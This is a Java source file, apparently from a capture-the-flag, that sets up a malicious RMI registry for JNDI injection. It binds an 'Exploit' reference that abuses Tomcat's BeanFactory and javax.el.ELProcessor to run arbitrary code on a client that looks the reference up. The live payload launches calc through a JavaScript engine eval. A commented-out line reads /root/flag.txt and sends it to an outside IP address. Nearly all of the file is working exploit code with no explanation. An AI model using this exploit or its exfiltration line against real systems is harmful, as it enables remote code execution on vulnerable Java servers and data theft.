package Demo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Tomc {
    public static void main(String[] args) throws Exception {
        int rmi_port = 1558;
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        System.out.println(System.getProperty("java.rmi.server.hostname"));
//        String command ="\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"\")";
//        String cmd = "connection=new java.net.URL('http://82.156.2.166:2337/').openConnection();connection.setRequestProperty('accept', new java.io.BufferedReader(new java.io.FileReader('/root/flag.txt')).readLine());connection.setRequestMethod('GET');connection.connect();connection.getResponseCode();";

//        String cmd = "new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()";
        String c = "java.lang.Runtime.getRuntime().exec('cmd /c calc');";
        String command = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+c+"\")";
        Registry registry = LocateRegistry.createRegistry(rmi_port);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "K=eval"));
        ref.add(new StringRefAddr("K", command));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
    }
}
